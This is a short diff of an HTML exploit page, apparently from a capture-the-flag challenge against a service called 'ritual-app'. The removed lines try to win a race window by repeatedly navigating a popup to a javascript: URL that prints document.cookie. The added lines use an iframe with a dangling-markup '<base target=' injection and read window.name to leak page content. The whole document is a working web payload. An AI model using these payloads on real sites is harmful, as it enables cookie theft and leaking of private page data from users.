@@ -1,13 +1,14 @@
+<html>
+<body>
+
+<iframe src="http://ritual-app:5000/<base target="></iframe>
+
 <script>
-let w = open("http://ritual-app:5000/");
+setTimeout(()=>{
+    console.log(window.name)
+},2000)
 
-// On essaye de hacker la race window
-let i = setInterval(() => {
-    try {
-        w.location = "javascript:console.log(document.cookie)";
-    } catch(e) {}
-}, 1);
-
-// Arrêter après 200ms pour ne pas boucler indéfiniment
-setTimeout(() => clearInterval(i), 200);
 </script>
+
+</body>
+</html>
